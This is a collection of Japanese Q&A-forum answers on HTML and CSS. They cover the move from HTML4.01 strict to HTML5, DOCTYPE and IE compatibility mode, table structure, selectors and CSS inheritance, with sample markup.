HTML5は膨大で習得は大変でしょう。 　私は、長いので結果的にはHTML2→HTML3.2→HTML4.01→HTML5と学んできましたから、ある意味・・とっても楽でした。 HTML2 ・・・ それまでの物をまとめて企画化した HTML3.2 ・・・・ インタラクティブなものやプレゼンテーションに関わる物が 　　　　　　　いくつか取り入れられた 　しかし、「どのような環境からも」というHTMLの大きな目的が失われた反省から HTML4.01が定められた。 　「HTMLは、常に構造的マーク付けを規定するところのSGMLをルーツに持っている。HTMLの性質上、プレゼンテーションに関する要素や属性は、次々と他の機構、とりわけスタイルシートに置換えられていく。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　HTMLはHTML4.01が最後の規格で、今後はXHTMLに移行するはずでした。しかし、XHTMLは厳密すぎる、任意の要素を追加できるなど難しいため・・W3Cと異なる組織でHTML5が準備されはじめた。XHTMLの普及も進まない中、W3Cも方針転換してHTML5を策定することに。XHTML2は中断。 　よって、今学ばれるならHTML5を見据えて、HTML4.01・・・そして必ずstrictで学ばれるのが良いでしょう。 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　その際に、HTML4.01の仕様書にも書かれているのですが、特に「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」に留意すると良いでしょう。すなわち、class名にHTML5の「文書をよりよく構造化するために、追加された新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」を使用し、それ以外は極力DIVを使わない。 [例] <body> 　<div class="header"> 　　<div class="nav"> 　　</div> 　</div> 　<div class="section"> 　　<div class="section"> 　　</div> 　　<div class="aside"> 　　</div> 　</div> 　<div class="footer"> 　</div> </body> のようなマークアップをしておけばHTML5に移行する時に <body> 　<header> 　　<nav> 　　</nav> 　</header> 　<section> 　　<section> 　　</section> 　　<aside> 　　</aside> 　</section> 　<footer> 　</footer> </body> と書き換えるだけですから・・ 基本的に 　⇒HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) を補習すればHTML5が分かる。 　まず 　⇒HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) をみにつけてから、HTML5に以降--行こう 　HTML5をいきなりより断然楽です。
>申し訳ないのですが、素人でしてどこで何をやればいいかもう少し具代的に教えていただきたいです。 どのくらいのスキルであるかは存じませんが、ここの解答欄で回答できる内容を越えています。 また、開発している人で無いとしたら、ここで具体例を出しても実装できない気がします。 たとえば、サーバ側でフレームワークを利用していれば書き方が違ってきます。 具体的な回答をするには以下の補足が必要です。 ・使用フレームワーク(おそらくstruts系？) ・サーバ側のjspを呼び出しているアクションクラス等 ・表示しているjsp ようは、それが動作している一式が無いと具体的な回答は難しいです。
<style type="text/css"> } 最初の「　｝　」が邪魔してます。 それから、htmlでは、divが閉じられていません。 ケアレスミスに注意しましょう。 タグ補完してくれるようなお助けツールをしよすると、ミスが減るような気がします。
申し上げにくいですが、その参考ページはお勧めできません。例えていうと、火打ち石での火の付け方を　マッチやライター等知らされずに勉強するような……。時代錯誤ですので、学ばれるなら今の勉強をしませんか？今は、htmlは文章構造を、cssでデザインの役割分担がなされるページが主流となっています。さらに動きをつけるならJavaScript等。 tableは文章構造ですが、色を付けたいなどは、文章構造ではありません。デザインの方です。なにもかも、htmlでやるには、手間がかかるばかりで、いいことない気がします。 それにそのページにも書いてありますが、ＩＥ専用ですよ。しかもＩＥ９でも動作しない。今は１０、そして１１に移行の時代に学ぶ価値無しの気がします。 余談はさておき、提示された条件のみでしたら、<head>の中に <style type="text/css"> table td {border:1px solid #00ffff;} </style> といれれば、何とかなると思います。 </head>のすぐ上などに入れてみてください。条件によっては、無理かもしれませんが、提示の条件だと行けると思います。
確かに、bgcolorだとかいろいろな設定はhtmlタグの中に書けます。 PCのエディタで作り、IEなどのブラウザで表示する、というだけであればCSSは余計なものに思うのは自然です。 ただし、こういうことになります。 箇条書きで10個ぐらいの記述があるとします。 <ul><li>をしたとして考えましょう。 １行目のメッセージのフォントカラーを青にしたいとします。その行の<li>に属性を与えればOK. ２行目は？　やっぱり前の行と同じように<li>にfont color=blueというようにやります。 これを１０行やる必要があります。１０行全部書く必要があります。 その中のひとつだけ注目を集めるためcolor=redにしたければ、たとえばそれが８行目なら８行目の<li>だけそうすればいい。 翌日、注目欄は８行目ではなく９行目になったとします。 修正場所は？　 ８行目はcolor=blue ９行目はcolor=red と直す必要がありますね。 １１行になる必要がでたら、１１行目にも青表示命令を書かなければなりません。 CSSを使うとどうなるか。 <li>というタグはfont color=blueとしておけば、本文が１０行であれ２０行であれいちいち書く必要はありません。 もしそのうちの１行だけ赤くしたければ、CSSでPICKUPというクラスのliを宣言し、color=redにします。 本文HTMLではclass="PICKUP"のように設定しておけばいいのです。 こういうことを、抽象化だとか部品化とかいろいろ呼ばれていますが、ミスなしにするテクニックです。 ある日、青文字を全部緑にしたいと思いついたら、CSSをgreenに書き換えるだけで、全ページはそれに従います。 ここまでが、CSSのふつうの働きです。 HTML5、CSS3になることでこの話は異常に展開します。 ひとつをお教えしますと、レスポンシブルページというものです。 同じページを、PC、タブレット、スマホ、ガラケーで見る可能性があると考えます。 昔なら、携帯用のサイトは/mだとかURLに別フォルダを作りましたがそんな必要はありません。 ブラウザの横幅のサイズがわかりますので、 　うんと短い場合（ガラケー） 　短い場合（スマホ縦置き） 　やや短い場合（スマホ横置き、またはタブレット） 　長い場合（PC) で、画像のサイズを調整したり折り返しをしたり、マウスを置いた時の動きを替えたり、これをCSSだけで行うのです。 HTMLを作るほうでは、一応CSSで何をするかによってidやクラスを想定する必要はありますが、１枚だけページを作れば問題ないのです。 こういうことを、問い合わせ元のブラウザの反応で切り分ける＝レスポンシブル、という操作名で実現します。
＞スマートなコーディングを諦めるかしたいと思います。 　いえ、全く逆です。!!! 　コーディング--HTMLやCSSのコードをスマートにする最善の方法は、文書構造 とプレゼンテーションの分離です。決して逆じゃないです。HTMLがスマートに コーディングされていると、シンプル（スマート)なスタイルシートですばらし いデザインのスタイルシートかけるのです。 　仕様書どおりに厳密にHTMLを作成する事とデザインと逆行すると誤解されてい る人が多いですが、実際は全く逆です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプ レゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やイン デントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々 なプロパティの設定が簡単にできる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣［Style Sheets in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　HTMLに文書構造しか書かれていないからこそ、デザインの自由度も大幅に良く なるので、全く異なるデザインに変更することも可能になるのです。 ＞IE8対応を捨ててCSS3にするか 　IE8が問題になるのは、互換モードです。標準モードで動作するようDOCTYPEを 宣言しておくと、基本的にどのブラウザでも大きな差はなくなるはずです。 ＞基本的にそのようなタグは容易されていないこと ＞その理由がよくわかりました。 　画像が(アルバムページの写真とか)そのページのコンテンツでしたら、 <object></object>や<img>要素を使用しますから用意されています。 　内容とは関係ないものでしたら、スタイルシートで背景として指定すればよい だけです。(スタイルシートで内容の追加も出来ますが・・)
＞　しかし、以下のサイトではうまくいきません。 <html> <body> <form action="http://kabuyoho.ifis.co.jp/index.php" method="get"> <input type="hidden" name="action" value="tp1"> <input type="hidden" name="sa" value="report"> <input type="text" name="bcode"> <input type="submit"> </form> </body> </html> 全く難しい話ではありません、基本的なHTMLの知識を身につければ分かることです。 本屋さんで売ってるHTMLの本を買ってくれば解説されています。
例えば 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 従来の Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) と異なり、ボタンでのチェックは出来ないようですね。
私も windows7 chrome 32.0.1700.76m で同じ現象が出ています。 バグですかね。 http://productforums.google.com/forum/#!topic/ch …
html4.01をhtml5の記述に変更したからと言って、上部に余白が空くという事はありません。 なのでバージョンの変更が原因ではなく、記述の誤りが原因だと推測できます。 一番クサいと感じるのは、IEの互換モードです。 ・IEで確認している ・変更前か変更後か、どちらかのドキュメントタイプ宣言が正しく書かれていない こういった場合は、互換モードが原因だと思います。 変更後の宣言に問題がある場合にはそれを修正すれば直りますが、 変更前の宣言が誤っていて、現在正しい宣言を記述したのだとすれば、それは「上部に隙間が空くように作られたページ」です。htmlかcssに根本的な問題が錯誤があります。 その場合には質問にある情報だけでは回答する事は出来ません。 ※ 互換モードというのは、cssが一般的になる以前に作られたサイトをあえて正しいcssの表現を適応せず、古いブラウザの表現方法で表示するIE独自の機能です。 html文書の1行目にドキュメントタイプの宣言を正しく書いていない場合に互換モードになります。
こんなところで聞いたって正確で正しい情報は得られない。まず何よりも先に仕様書を調べること!! 　⇒表( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 11.2.1 TABLE要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　には、 <!ELEMENT TABLE - - (CAPTION?, (COL*|COLGROUP*), THEAD?, TFOOT?, TBODY+)> と書かれている。 　　(注)?は0個または1、*は0個以上、+はひとつ以上と言う意味、|は「又は」ですから 要素 TABLEは 　CAPTION?　　CAPTION は、存在しないか１つのみ 　(COL*|COLGROUP*)　COLかCOLGROUPを０個以上--なくても良いし、いくつあっても良い 　THEAD?　　　THEADは、存在しないか１つのみ 　TFOOT?　　　THEADは、存在しないか１つのみ 　TBODY+　　　TBODYは、【ひとつ以上】すなわち必須!! と書かれています。 　CAPTION,THEAD,TFOOTなどそれぞれの要素は、 11.2.2 表題: CAPTION要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 11.2.3 行グループ: THEAD、 TFOOT、及びTBODY要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　などに詳しく書かれています。 CAPTIONは、最初に書け!!、THEAD,TFOOTはTBODYより前・ すなわち、<table>に続いて、<tr>は書くことは出来ません。tdが置けるのは <!ELEMENT THEAD - O (TR)+ <!ELEMENT TFOOT - O (TR)+ <!ELEMENT TBODY - O (TR)+ ですから、正式に記述すると <table summary="この表の言葉での説明を書く" border="1"> 　<caption>今月の予定</caption> 　<thead> 　　<tr> 　　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　　</tr> 　</thead> 　<tfoot> 　　<tr> 　　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　　</tr> 　</foot> 　<tbody><!-- TBODY開始タグは、表が本体をただ1つだけ含んでいてヘッダもフッタも含まないという場合を除き、常に必要である。 --> 　　<tr> 　　　<td></td><td>1</td><td>2</td><td>3</td><td>4</td><td>5<td><td>6</td> 　　</tr> 　</tbody> </table> 最低限ですますなら <table summary="この表の言葉での説明を書く" border="1"> 　<tr> 　　<th abbr="Sun">日曜</th><th abbr="Chu">火曜</th>・・・<th abbr="Sat">土曜</th> 　</tr> 　<tr> 　　<td></td><td>1</td><td>2</td><td>3</td><td>4</td><td>5<td><td>6</td> 　</tr> </table> 　※ただひとつの本体しか含まず、THEAD,TFOOTも含まないのでTBODYは省略できる。 になります。 summaryは、「表のsummary(要約)をユーザが得られるようにする。 著者は、非視覚系ユーザエージェントのユーザにも理解しやすいよう、表の内容と構造に関する要約を提供する必要がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　HTML5では必須でなくなりました。 border="1"は、スタイルシートを理解しないブラウザのために、通常は書いておきます。 ＞これってダメな例なんですよね？ 　そのマークアップ自体は、summary属性がないことをのぞき特に誤りと言うわけではありませんが、デザインや配置のために、本来表でない物をtableでマークアップするのは、文法以前に誤りです。 ・単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ・ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) などにURLを入れてチェックすると分かりますけど・・ ブラウザには関係しません。ブラウザは常に 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLユーザエージェント 　HTMLユーザエージェント【あるいは単にユーザエージェント】とは、HTML文書を解釈するプログラムのことを指す ・・・【中略】・・・ 　HTML 4仕様に適合するユーザエージェントとは、この仕様の必須事項と下記の3点とを遵守するもののことを指す。 ・・・【中略】・・・ 　過去との互換性のため、HTML 4 を解釈するツールについては、HTML 3.2 ([HTML32]参照)並びにHTML 2.0 ([RFC1866]参照)をもサポートすることを推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より HTML5でも同様です。 　ただしHTML5では、明確に「著者が使ってはならない」けど「ユーザーエージェントは理解しなければならない」と区別されました。 http://momdo.s35.xrea.com/web-html-test/spec/WD- …
小学校の国語を思い出してください。 新しいテーマについて話題が始まるときには、段落を変えて一文字下げますよね。 <p>Paragraph</p>とはそれを意味するマークアップです。 　一方、br(forced line break)は、文字通り、ひとつの段落でありながらの強制改行ですから、原則として一般的な文書には現れないはずです。 ★難しく言うと、改行自体がその記事の内容であるときがbrと言う事です。 　(例)住所で広域の部分と詳細部分を区切る 　　　詩において、行を変えることも内容であるとき 　段落<p></p>は、スクリーンリーダーだと、その前後にすこし間をとってくれるでしょうが、<br>だと「改行」と読む可能性があります。 　よく初心者が書いているページに、行間をつめるときは,br、間を開けるときはpなんて書いてあるのを見かけます。文字を大きくしたければh1とか・・・。これらは明白な誤りです。行間や段落間の調整はスタイルシートで行えばすみます。 p{margin:0;line-height:1.6em;text-indent:1em;}
いいえ、HTMLの仕様書の最初のほうに 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。 なぜならただ1種類の文書しか作る必要がなくなるからだ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣※ 　もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い賛同を反映するようにされてきた。 （いちいち新しい端末が登場するたびに別の物を作る事はしたくないと言うこと） 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ※アンダーラインや（）は私が補足 　HTMLを使ってウェブページを作成するのは、そのためです。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ ・文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　と随所に指摘されている。 ＞ホームページを作る際に携帯に対応させる場合は携帯用のコードを作らないとダメなのでしょうか？ 　ウェブページ(ホームページじゃない)を作成するときに、HTMLを使うことで、たった一つの文書さえ作ればよくなるのです。
＞okwaveやほかの大手サイトでも使用されているのに、逸脱した手法ですか？ 　そうなのです。なにせokwebは、歴史のあるサイトでしてそれを利用した質問サイトはたくさんあります。その当時は、今のように文書構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )と言っても対応しているブラウザも少なく、IEが幅を利かしていましたから。 　
サイトでタグがぐちゃぐちゃなのでは、稼ぐのは厳しいかと。 無料ブログなら手軽にはじめられて、めちゃくちゃになることはないでしょう。
HTML5とストリーミングは関係ないです。 　HTML5では<video>タグが加わりましたから、動画コンテンツを制御できますがデータ自体は、ストリームサーバーから提供させないとなりません。 　HTML5で<video src="rtsp://　とか・・、HTTPサーバーを使うことも出来ますが・・ 　通信プロトコルと、文書の書式は区別しましょう。 　
そこにmarginを使うなら、 #soto{ width:320px; height:480px; background-color:#FB0004; padding:1px;/* とpaddingを0以上の値でしたいしないとなりません */ } あるいは、 #soto{ width:320px; height:480px; background-color:#FB0004; border:#FB0004 solid 1px; } この理由は、 　⇒8 ボックスモデル( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒9 視覚整形モデル( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒10 視覚整形モデル詳細( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) を参照してください。大変な量なので説明は省きます。 この場合、marginで指定するよりposition:relative;position:absoluteで指定するほうが楽ですよ。
＞background-position のleft のピクセルを上げたら、このimageが普通は右に移動してくれそうなもんなんですがなぜか下に動いてしまいます。 　違います。 background-position left 5px は、左端で上から5pxと言う意味です。 「少なくとも1つの値がキーワードでない場合は、最初の値は水平方向の位置を表し、2番目は垂直位置を表す。( http://momdo.s35.xrea.com/web-html-test/spec/CSS … )」 　この仕組みは、他のプロパティでも共通な方法なので間違えるはず無いですけど background-repeat : no – repeat 　これも間違い!!、no-repeatです。 background-position left 5px 　左0%、上から5pxと言う意味 　とにかく仕様書を最初から通して読んでおきましょう。
ブラウザによって差がありますが、 リンクの擬似クラスと子孫セレクタをつかって・・・ a:link img{text-decoration:none;border-style:none;} a要素内のすべての場合は(a name="") a img{text-decoration:none;border-style:none;} 通常は残しておいて、ナビゲーション内だけなら 　div.nav a img{} と指定すると良いでしょう。 　ユーザーインターフェースに関わる部分なので、障害者のことを考えると、リンクがあると明示したほうが良いのです。 a img{border:none;text-decoration:none;} a:hover{border:1px solid red;} として分かりやすくしても良いでしょう。
そういう仕様だと思います。 他のページでも、テキスト部分をタップするだけでは選択されませんでした。 完了を押さないと選択されないようです。
いつもまず、仕様書を確認する。 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML 4.01厳密型DTD。(上記HTML4.01strictのこと) 　これは、推奨しないこととなった要素や属性を含まず、またフレーム設定用の要素・属性をも含まない。 このDTDを用いる文書は、次の文書型宣言をせよ。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ・XHTMLはDOCTYPE宣言が異なり、XML宣言も必要になります。 ・XHTML1.1/HTML5にはすでにstrict以外ありません。 ・XHTMLは、他のアプリケーションとの連携などが必要な場合以外使用しなくて良いでしょう。 ＞<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> や ＞<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"> にすると、 　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) にあるように、ブラウザ間の表示差に悩まされることになります。ここでの「ブラウザ間で表示差がある」という質問のほとんどすべてはこれに起因しています。 　なお、 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATA入力(右上)で作成したHTMLをチェックして、その説明を読むと上達が早いです。 　
DOCTYPEは正しく書きましたか？ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> ・・これで、「下記のautoに未対応用のセンタリング」の必要はほとんどなくなるはずです。IE7以降は中央に配置されます。 　全体を囲む必要は無いですが、もし使用するなら、mainより、articleのほうが適切でしょう。(idやclass名は文書構造を示すために記述します。 　文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　が、HTML5を見据えるとHTML5の要素名にしてclassのほうが良いでしょう。 　⇒4.5 Grouping content — HTML5( http://www.w3.org/TR/html5/grouping-content.html … ) 　⇒4.4.2 The article element( http://www.w3.org/TR/html5/sections.html#the-art … ) 　幅は最近のようにスマホや幅広ディスプレイなど様々な利用を考えるとリキッドのほうが楽でしょう。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} div.header,div.section,div.footer{ width:70%; min-width:470px;/* スマホ用 */ max-width:900px;/* 幅広ディスプレイ用 */ margin:0 auto;/* 中央配置 */ padding:5px; } div.section{position:relative;}/* 内容の位置基準にするため */ div.section div.section{ min-height:200px; margin:0 0 0 21%;/* 左を空ける */ width:auto;/* 幅指定を戻す */ min-width:0; } div.section h2,div.section p{ margin-left:21%;/* 左を空ける */ } div.section div.section p{ margin-left:0;/* 元に戻す */ } div.section div.contentTable{ position:absolute; /* 以下、position:staticでない直近の親を参照 */ width:20%;height:100%;/* 目次の位置決め */ top:0;left:0; } /* 分かりやすいように色 */ body{background-color:gray;} div.header{background-color:white;} div.section{background-color:lime;} div.footer{background-color:aqua;} div.section div.contentTable{background-color:fuchsia;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<div class="section" id="section1"> ＿＿＿<h3>見出し</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<h3>見出し</h3> ＿＿＿<p>記事</p> ＿＿</div> ＿＿<div class="contentTable"> ＿＿＿<ol> ＿＿＿＿<li><a href="#section1">1章</a></li> ＿＿＿＿<li><a href="#section2">2章</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
head部分のサンプルです。 以下、スタイルシートの説明です。 (1)もし、行先頭のセルが<th>でしたら table[summary="test"] th{background-color:red;text-align:right;font-weight:normal;} 　ですむはずです。スタイルシートを見ただけで「test1の表の見出しセルは、赤背景で右寄せで通常文字」だと、誰が見ても分かります。 (2)見出しセルでないのでしたら、隣接セレクタを使うと簡単です。 table[summary="schedule"] th, table[summary="schedule"] td{background-color:fuchsia;} table[summary="schedule"] th+th, table[summary="schedule"] td+td{background-color:transparent;} (3)あるいは、last-child:擬似クラスをつかうとセルがいくら増えても良い table[summary="schedule2"] th:last-child, table[summary="schedule2"] td:last-child{background-color:aqua;} (4)クラスを使うなら table#schedule3 th[abbr="Sun"], table#schedule3 td.Sun{background-color:fuchsia;} table#schedule3 th[abbr="Sat"], table#schedule3 td.Sat{background-color:aqua;} ★セレクタの書き方はCSSで最も重要な部分ですから、まずそれを身につけましょう。それだけで、HTMLもCSSもとっても楽になります。 　⇒5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　⇒6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ★ブラウザ間の表示差をなくすため、ウェブ標準HTML4.01strict+CSS2.1で書いています。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html )のDATAでチェック済み ★HTMLにはデザインに関する事は一切書かれていないため、先でどのようにデザインを変えるのも自由自在です。水曜日は黄色にしようとか思っても、HTMLに手を加える必要は無いですね。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title>サンプル</title> <meta name="author" content="ORUKA1951"> <meta http-equiv="Content-Style-Type" content="text/css"> <link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > <link rel="START" href="../index.html"> <style type="text/css"> <!-- table{border-collapse:collapse;margin:10px;border:solid 2px black;} table th,table td{border:gray 1px solid;padding:5px 10px;} table[summary="test"] th{background-color:red;text-align:right;font-weight:normal;} /* +隣接セレクタ */ table[summary="schedule"] th, table[summary="schedule"] td{background-color:fuchsia;text-align:right;} table[summary="schedule"] th+th, table[summary="schedule"] td+td{background-color:transparent;text-align:left;} table[summary="schedule"] th+th+th+th+th+th+th, table[summary="schedule"] td+td+td+td+td+td+td{background-color:aqua;} /* last-child擬似クラス */ table[summary="schedule2"] th, table[summary="schedule2"] td{background-color:fuchsia;text-align:right;} table[summary="schedule2"] th+th, table[summary="schedule2"] td+td{background-color:transparent;text-align:left;} table[summary="schedule2"] th:last-child, table[summary="schedule2"] td:last-child{background-color:aqua;} /* classセレクタ */ table#schedule3 th[abbr="Sun"], table#schedule3 td.Sun{background-color:fuchsia;text-align:right;} table#schedule3 th[abbr="Sat"], table#schedule3 td.Sat{background-color:aqua;} --> </style> </head>
「　」では空白にならない場合があるので、そんなときにとりあえず「」を使っています。 ブラウザ等で見え方が変わるので、CSSで後ほど調整するようにしています。
＞テーブルの中は適は適用されないということは、調べていくうちにわかったのですが 　そんなことはありません。 font-sizeとcolorプロパティは、継承されるプロパティです。 'color' 値: <color> | inherit ・・・【中略】・・・ 継承: yes ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 'font-size' 値: <absolute-size> | <relative-size> | <length> | <percentage> | inherit ・・・【中略】・・・ 継承: yes ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ★サンプルです。 ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATA入力でチェック済みのHTML4.01strictとCSS2.1のウェブ標準です。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- body{color:blue;font-size:80%;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table summary ="test" border="1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th>あ行</th><th>か行</th><th>さ行</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>あ</td><td>か</td><td>さ</td> ＿＿＿＿</tr> ＿＿＿＿＿<td>い</td><td>き</td><td>し</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html> ★ひょっとしてですが、IEが互換モードで動作している？？ スタイルシートを使用する場合、必ず標準モード--ウェブ標準で作成しないと、様々な場面でブラウザによる表示差に悩まされることになりますよ。 「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 現在のブラウザの多くはCSS標準に基づいてページを表示するするようになっています。このCSSの標準に準拠して表示するモードを『標準モード』、一方過去のブラウザでも表示できるようなレイアウトで表示するモードを『互換モード』と呼んでいます。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTMLのDOCTYPEスイッチとCSS（標準モードと互換モード）：スタイルシート（CSS）辞典 - HTMLタグボード( http://www.dspt.net/stylesheet_css/001/011.html )］より DOCTYPE 宣言を上記のように <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> と記述して、書きましょう。 